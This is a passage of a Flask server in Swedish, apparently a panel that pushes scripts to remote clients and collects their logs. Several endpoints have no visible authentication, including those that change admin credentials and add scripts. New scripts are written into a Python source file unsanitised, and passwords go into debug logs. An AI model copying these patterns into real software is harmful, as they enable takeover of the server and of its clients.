            return jsonify({"status": "error", "message": "Klient hittades inte"}), 404
        
        # Hämta och validera instruktion
        data = {}
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form.to_dict()
            
        instruction = data.get("instruction", "")
        
        if not instruction or instruction not in INSTRUCTIONS:
            logging.warning(f"Ogiltigt instruktionsförsök: {instruction}")
            return jsonify({
                "status": "error", 
                "message": f"Ogiltig instruktion. Giltiga val: {', '.join(INSTRUCTIONS.keys())}"
            }), 400
        
        # Uppdatera klientinstruktion
        client_index[client_id]["instruction"] = instruction
        
        # Skriv till loggfil att instruktion uppdaterades
        client_log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{client_id}.log")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{timestamp} [SERVER] Instruktion uppdaterad till '{instruction}'\n"
        
        with open(client_log_file, "a", encoding="utf-8") as f:
            f.write(log_entry)
        
        # Spara uppdaterat index
        with open(INDEX_FILE, "w", encoding="utf-8") as f:
            json.dump(client_index, f, indent=4)
        
        logging.info(f"Instruktion för klient {client_id} uppdaterad till '{instruction}'")
        
        return jsonify({
            "status": "success", 
            "message": f"Instruktion uppdaterad för klient {client_id}"
        })
    
    except Exception as e:
        logging.error(f"Fel vid uppdatering av instruktion för klient {client_id}: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/api/scripts", methods=["GET"])
def api_get_scripts():
    """API för att hämta alla tillgängliga scripts."""
    logging.debug(f"Förfrågan om scriptlista från {request.remote_addr}")
    
    try:
        # Bygger ett objekt med alla scripts och deras kod
        scripts = {}
        
        # Lägg till alla instruktioner från instructions.py
        for key, value in INSTRUCTIONS.items():
            scripts[key] = value
            
        logging.debug(f"Returnerar {len(scripts)} scripts")
        return jsonify(scripts)
    
    except Exception as e:
        logging.error(f"Fel vid hämtning av scripts: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({}), 500

@app.route("/api/scripts", methods=["POST"])
def api_add_script():
    """API för att lägga till ett nytt script."""
    logging.debug(f"Förfrågan om att lägga till script från {request.remote_addr}")
    
    try:
        # Hämta data
        if not request.is_json:
            return jsonify({"status": "error", "message": "JSON-data krävs"}), 400
            
        data = request.get_json()
        name = data.get("name", "").strip()
        content = data.get("content", "").strip()
        
        if not name or not content:
            return jsonify({"status": "error", "message": "Både namn och innehåll krävs"}), 400
            
        if not name.isalnum() and not (name.isalnum() or '_' in name):
            return jsonify({"status": "error", "message": "Scriptnamn får bara innehålla bokstäver, siffror och understreck"}), 400
            
        # Verifiera att namnet inte redan finns
        if name in INSTRUCTIONS:
            return jsonify({"status": "error", "message": f"Ett script med namnet '{name}' finns redan"}), 409
            
        # Lägg till scriptet i instructions.py
        instructions_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "instructions.py")
        
        with open(instructions_file, "r", encoding="utf-8") as f:
            instructions_content = f.read()
            
        # Förbered nya scriptet
        new_script = f'\n    "{name}": """\n{content}\n""",\n}}'
        
        # Ersätt slutet av dictdeklarationen
        instructions_content = instructions_content.replace("}}", new_script)
        
        with open(instructions_file, "w", encoding="utf-8") as f:
            f.write(instructions_content)
            
        # För att omedelbart tillgängliggöra det nya scriptet, uppdatera INSTRUCTIONS
        INSTRUCTIONS[name] = content
            
        logging.info(f"Lagt till nytt script: {name}")
        
        return jsonify({
            "status": "success", 
            "message": f"Script '{name}' lagt till"
        })
    
    except Exception as e:
        logging.error(f"Fel vid tillägg av script: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/api/update_credentials", methods=["POST"])
def api_update_credentials():
    """API-endpunkt för att uppdatera adminuppgifter."""
    logging.debug(f"Uppdatera uppgifterförfrågan från {request.remote_addr} med data: {request.get_data(as_text=True)}")
    logging.info(f"Uppdatera uppgifterförfrågan från {request.remote_addr}")
    try:
        if request.is_json:
            data = request.get_json()
            username = data.get("username")
            password = data.get("password")
        else:
            username = request.form.get("username")
            password = request.form.get("password")
        logging.debug(f"Parsad data - användarnamn: {username}, lösenordslängd: {len(password) if password else 0}")
            
        if not username or not password:
            logging.warning("Ogiltig uppdateringsförfrågan för uppgifter: Saknar användarnamn eller lösenord")
            return jsonify({"status": "error", "message": "Användarnamn och lösenord krävs"}), 400
    except Exception as e:
        logging.error(f"Fel vid parsning av uppdateringsförfrågan för uppgifter: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": f"Ogiltigt förfrågningsformat: {str(e)}"}), 400
        
    try:
        success = set_admin_credentials(username, password)
        if success:
            logging.info(f"Adminuppgifter uppdaterade framgångsrikt för användare {username}")
            return jsonify({"status": "success"})
        else:
            logging.warning(f"Misslyckades med att uppdatera adminuppgifter för användare {username}")
            return jsonify({"status": "error", "message": "Misslyckades med att uppdatera uppgifter"}), 500
    except Exception as e:
        logging.error(f"Fel vid uppdatering av adminuppgifter: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": f"Fel vid uppdatering av uppgifter: {str(e)}"}), 500

@app.route("/api/clients/<client_id>/ping", methods=["POST"])
def api_clients_ping(client_id):
    """API för att pinga en klient från React-frontend."""
    logging.debug(f"Pingförfrågan för klient {client_id} från React-frontend")
    
    # Samma funktionalitet som api_ping_client
    return api_ping_client(client_id)

@app.route("/api/clients/<client_id>/logs", methods=["DELETE"])
def api_clients_clear_logs(client_id):
    """API för att rensa loggar för en klient från React-frontend."""
    logging.debug(f"Rensningförfrågan för klient {client_id} loggar från React-frontend")
    
    # Samma funktionalitet som api_clear_logs
    return api_clear_logs(client_id)

@app.route("/api/clients/<client_id>/logs/export", methods=["GET"])
def api_clients_export_logs(client_id):
    """API för att exportera loggar för en klient."""
    logging.debug(f"Exportförfrågan för klient {client_id} loggar från {request.remote_addr}")
    
    try:
        # Kontrollera om loggfilen finns
        client_log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{client_id}.log")
        if not os.path.exists(client_log_file):
            logging.warning(f"Försök att exportera icke-existerande loggfil för klient {client_id}")
            return jsonify({"status": "error", "message": "Inga loggar hittades för klienten"}), 404
        
        # Skapa en minnesbuffert för zip-filen
        memory_file = BytesIO()
        
        # Skapa zip-arkiv i minnet
        with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Läs och lägg till loggfilen
            with open(client_log_file, 'rb') as f:
                zf.writestr(f"client_{client_id}.log", f.read())
        
        # Sätt pekaren till början av filen
        memory_file.seek(0)
        
        logging.info(f"Exporterar loggar för klient {client_id}")
        
        # Returnera zip-filen som nedladdning
        return send_file(
            memory_file,
            mimetype='application/zip',
            as_attachment=True,
            download_name=f'logs_{client_id}.zip'
        )
    
    except Exception as e:
        logging.error(f"Fel vid export av loggar för klient {client_id}: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/api/clients/<client_id>/instruction", methods=["PUT"])
def api_clients_set_instruction(client_id):
    """API för att sätta instruktion för en klient från React-frontend."""
    logging.debug(f"Instruktionsuppdateringsförfrågan för klient {client_id} från React-frontend")
    
    # Samma funktionalitet som api_set_instruction men anpassad för PUT-metod
    return api_set_instruction(client_id)

@app.route("/viewer", methods=["GET", "POST"])
def viewer():
    """Adminpanel för att visa klientloggar."""
    logging.debug(f"Visarförfrågan från {request.remote_addr}, metod: {request.method}")
    admin_username, admin_password = get_admin_credentials()
    
    if "authenticated" not in session:
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            logging.info(f"Inloggningsförsök från {request.remote_addr}: användarnamn='{username}'")
            if username == admin_username and password == admin_password:
                logging.info("Inloggning lyckades")
                session["authenticated"] = True
                return redirect(url_for("viewer"))
            else:
                logging.warning("Inloggning misslyckades: Ogiltiga uppgifter")
                return render_template("login.html", error="Ogiltiga inloggningsuppgifter")
        logging.debug("Renderar inloggningssida")
        return render_template("login.html")

    if "logout" in request.args:
        session.pop("authenticated", None)
        logging.info(f"Användare loggade ut från {request.remote_addr}")
        return redirect(url_for("viewer"))

    clients = {}
    if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
        try:
            logging.debug(f"Laddar client_index för visaren från {INDEX_FILE}")
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                clients = json.load(f) or {}
            logging.debug(f"Laddade {len(clients)} klienter")
        except Exception as e:
            logging.error(f"Fel vid läsning av client_index.json för visaren: {e}")
            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
            clients = {}
    else:
        logging.debug(f"Initialiserar tomt klientindex på {INDEX_FILE}")
        if os.path.exists(INDEX_FILE) and os.path.isdir(INDEX_FILE):
            logging.warning("Klientindexvägen är en katalog. Tar bort och skapar ny fil.")
            shutil.rmtree(INDEX_FILE)
        os.makedirs(os.path.dirname(INDEX_FILE), exist_ok=True)
        with open(INDEX_FILE, "w", encoding="utf-8") as f:
            json.dump({}, f, indent=4)

    for client_id, client_info in clients.items():
        client_info["is_active"] = is_client_active(client_info.get("last_activity", ""))
        logging.debug(f"Klient {client_id} aktiv status: {client_info['is_active']}")

    selected_client = request.args.get("client", "")
    log_content = ""
    client_info = None
    sort_order = request.args.get("sort", "newest")
    logging.debug(f"Vald klient: {selected_client}, sorteringsordning: {sort_order}")

    if selected_client and selected_client in clients:
        client_info = clients[selected_client]
        log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{selected_client}.log")
        if os.path.exists(log_file):
            try:
                with open(log_file, "r", encoding="utf-8", errors="replace") as f:
                    log_content = f.read()
                logging.debug(f"Läste logginnehåll från {log_file}, längd: {len(log_content)}")
                if sort_order:
                    log_content = sort_log_entries(log_content, sort_order)
                log_content = log_content.replace("\n", "<br>").replace(" ", " ")
            except Exception as e:
                logging.error(f"Fel vid läsning av loggfil {log_file}: {e}")
                logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
                log_content = f"<span style='color:red'>Fel vid läsning av loggfil: {str(e)}</span>"
        else:
            log_content = "<span style='color:orange'>Inga loggar tillgängliga för denna klient än.</span>"
            logging.debug(f"Ingen loggfil hittades för {selected_client}")

    total_clients = len(clients)
    try:
        total_logs = sum(1 for filename in os.listdir(CLIENT_LOGS_DIRECTORY) if filename.endswith('.log'))
        logging.debug(f"Räknade {total_logs} loggfiler")
    except Exception as e:
        logging.error(f"Fel vid räkning av loggfiler: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        total_logs = 0
        
    active_clients = sum(1 for client in clients.values() if is_client_active(client.get("last_activity", "")))
    logging.debug(f"Aktiva klienter: {active_clients}")

    storage_used = 0
    try:
        for root, dirs, files in os.walk(LOG_DIRECTORY):
            for file in files:
                file_path = os.path.join(root, file)
                if os.path.isfile(file_path):
                    storage_used += os.path.getsize(file_path)
        logging.debug(f"Beräknade lagringsutnyttjande: {storage_used} byte")
    except Exception as e:
        logging.error(f"Fel vid beräkning av lagringsutnyttjande: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")

    if storage_used < 1024:
        storage_used_str = f"{storage_used} B"
    elif storage_used < 1024 * 1024:
        storage_used_str = f"{storage_used / 1024:.2f} KB"
    elif storage_used < 1024 * 1024 * 1024:
        storage_used_str = f"{storage_used / (1024 * 1024):.2f} MB"
    else:
        storage_used_str = f"{storage_used / (1024 * 1024 * 1024):.2f} GB"
    logging.debug(f"Lagringsutnyttjande formaterat: {storage_used_str}")

    latest_activity = datetime.fromtimestamp(0)
    for cinfo in clients.values():
        last_activity_str = cinfo.get("last_activity", "")
        try:
            last_activity_dt = datetime.strptime(last_activity_str, "%Y-%m-%d %H:%M:%S")
            if last_activity_dt > latest_activity:
                latest_activity = last_activity_dt
        except ValueError:
            pass

    latest_activity_str = (
        latest_activity.strftime("%Y-%m-%d %H:%M:%S") if latest_activity.timestamp() > 0
        else "Ingen aktivitet"
    )
    logging.debug(f"Senaste aktivitet: {latest_activity_str}")

    try:
        sorted_clients = sorted(
            [{"id": cid, **cdata} for cid, cdata in clients.items()],
            key=lambda x: datetime.strptime(x.get("last_activity", "1970-01-01 00:00:00"), "%Y-%m-%d %H:%M:%S"),
            reverse=True
        )
        logging.debug(f"Sorterade {len(sorted_clients)} klienter efter senaste aktivitet")
    except Exception as e:
        logging.error(f"Fel vid sortering av klienter: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        sorted_clients = [{"id": cid, **cdata} for cid, cdata in clients.items()]
    
    if request.args.get("partial") == "1" and selected_client:
        logging.debug(f"Returnerar partiellt svar med logginnehåll för {selected_client}")
        return log_content
    
    logging.debug("Renderar viewer.html med all data")
    return render_template(
        "viewer.html",
        clients=clients,
        sorted_clients=sorted_clients,
        selected_client=selected_client,
        client_info=client_info,
        log_content=log_content,
        total_clients=total_clients,
        active_clients=active_clients,
        total_logs=total_logs,
        storage_used=storage_used_str,
        latest_activity=latest_activity_str,
        sort_order=sort_order,
        instruction_types=list(INSTRUCTIONS.keys())
    )

def auto_ping_clients():
    """Skickar periodiska pingar till alla klienter."""
    global auto_ping_running
    logging.debug("Autopingtråd startad")
    logging.info("Autopingtråd startad. Kommer att pinga klienter var %d sekund.", AUTO_PING_INTERVAL)
    
    while auto_ping_running:
        logging.debug("Startar automatisk pingcykel")
        logging.info("Startar automatisk ping av alla klienter...")
        try:
            client_count = 0
            online_count = 0
            offline_count = 0
            
            if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
                with open(INDEX_FILE, "r", encoding="utf-8") as f:
                    clients = json.load(f) or {}
                logging.debug(f"Laddade klienter för ping: {list(clients.keys())}")
                
                client_count = len(clients)
                if client_count == 0:
                    logging.info("Inga klienter hittades att pinga.")
                
                for client_id, client_info in clients.items():
                    logging.debug(f"Pingar klient: {client_id}")
                    try:
                        last_activity_str = client_info.get("last_activity", "1970-01-01 00:00:00")
                        last_activity = datetime.strptime(last_activity_str, "%Y-%m-%d %H:%M:%S")
                        now = datetime.now()
                        
                        if (now - last_activity) < timedelta(minutes=ONLINE_THRESHOLD_MINUTES):
                            update_ping_status(client_id, "online")
                            logging.info(f"Klient {client_id} är online (nyligen aktiv)")
                            online_count += 1
                        else:
                            update_ping_status(client_id, "offline")
                            logging.info(f"Klient {client_id} är offline (inaktiv)")
                            offline_count += 1
                    except Exception as e:
                        logging.error(f"Fel vid ping av klient {client_id}: {e}")
                        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
            else:
                logging.warning("Klientindexfilen hittades inte eller är en katalog")
                if not os.path.exists(INDEX_FILE) or os.path.isdir(INDEX_FILE):
                    if os.path.isdir(INDEX_FILE):
                        shutil.rmtree(INDEX_FILE)
                    os.makedirs(os.path.dirname(INDEX_FILE), exist_ok=True)
                    with open(INDEX_FILE, "w", encoding="utf-8") as f:
                        json.dump({}, f, indent=4)
                    logging.info("Skapade tom klientindexfil")
            
            logging.info(f"Autoping slutförd. Resultat: {client_count} totalt, {online_count} online, {offline_count} offline")
            try:
                os.makedirs(os.path.dirname(PING_STATUS_FILE), exist_ok=True)
                with open(PING_STATUS_FILE, "w", encoding="utf-8") as f:
                    json.dump({
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "total_clients": client_count,
                        "online_clients": online_count,
                        "offline_clients": offline_count
                    }, f, indent=4)
                logging.debug(f"Sparade pingstatus till {PING_STATUS_FILE}")
            except Exception as e:
                logging.error(f"Fel vid sparande av pingstatistik: {e}")
                logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        except Exception as e:
            logging.error(f"Fel under automatisk ping: {e}")
            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        
        logging.debug(f"Väntar {AUTO_PING_INTERVAL} sekunder till nästa autoping")
        time.sleep(AUTO_PING_INTERVAL)

def start_auto_ping():
    """Startar autopingbakgrundstråden."""
    global auto_ping_thread, auto_ping_running
    logging.debug("Försöker starta autopingtråd")
    try:
        if auto_ping_thread is None or not auto_ping_thread.is_alive():
            auto_ping_running = True
            auto_ping_thread = threading.Thread(target=auto_ping_clients)
            auto_ping_thread.daemon = True
            auto_ping_thread.start()
            logging.info("Bakgrundstråd för automatisk ping startad framgångsrikt")
            return True
        else:
            logging.info("Autopingtråden körs redan")
            return True
    except Exception as e:
        logging.error(f"Misslyckades med att starta autopingtråd: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return False

def stop_auto_ping():
    """Stoppar autopingbakgrundstråden."""
    global auto_ping_running
    logging.debug("Stoppar autopingtråd")
    auto_ping_running = False
    logging.info("Bakgrundstråd för automatisk ping stoppas (slutar efter nuvarande cykel)")

@app.route("/health", methods=["GET"])
def health_check():
    """Enkel hälsokontroll-endpunkt."""
    logging.debug(f"Hälsokontrollförfrågan från {request.remote_addr}")
    return jsonify({
        "status": "ok",
        "timestamp": datetime.now().isoformat(),
        "server": "neea-server",
        "version": "1.2.0"
    })

@app.route("/version", methods=["GET"])
def version_check():
    """Returnerar Python-version för felsökning."""
    import sys
    logging.debug(f"Versionskontrollförfrågan från {request.remote_addr}")
    version = f"Python-version: {sys.version}"
    logging.debug(f"Returnerar version: {version}")
    return version

@app.route("/", methods=["GET"])
def index():
    """Omdirigerar till visaren."""
    logging.debug(f"Rotförfrågan från {request.remote_addr}, omdirigerar till visaren")
    return redirect(url_for("viewer"))

if __name__ == "__main__":
    logging.info("Startar Neea-server...")
    logging.debug(f"Basdirectory: {BASE_DIR}")
    logging.debug(f"Loggkatalog: {LOG_DIRECTORY}")
    logging.debug(f"Klientloggkatalog: {CLIENT_LOGS_DIRECTORY}")
    logging.debug(f"Indexfil: {INDEX_FILE}")
    
    for directory in [LOG_DIRECTORY, CLIENT_LOGS_DIRECTORY, STATIC_DIRECTORY]:
        logging.debug(f"Säkerställer att katalogen finns: {directory}")
        os.makedirs(directory, exist_ok=True)
    
    logging.debug("Installerar statiska filer")
    install_static_files()
    
    logging.debug("Startar autopingtråd")
    started = start_auto_ping()
    if started:
        logging.info("Autopingtråd startad framgångsrikt.")
    else:
        logging.warning("Misslyckades med att starta autopingtråd.")
    
    logging.info("Startar servern på port 8080 med HTTP...")
    app.run(host="0.0.0.0", port=8080, debug=False)
